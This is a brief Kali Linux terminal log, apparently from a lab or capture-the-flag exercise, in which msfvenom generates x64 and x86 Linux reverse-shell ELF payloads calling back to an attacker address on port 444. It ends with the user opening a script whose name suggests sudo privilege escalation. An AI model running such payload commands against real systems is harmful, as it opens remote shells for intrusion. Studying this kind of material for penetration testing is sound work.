
```sh
┌──(kali㉿kali)-[~/shells]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.21.236 LPORT=444 -f elf -o revsh444.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: revsh444.elf
                                                                                                                              
┌──(kali㉿kali)-[~/shells]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.18.21.236 LPORT=444 -f elf -o revsh444-32.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: revsh444-32.elf
                                                                                                                              
┌──(kali㉿kali)-[~/shells]
└─$ nano mksudo-www-data.sh  
```
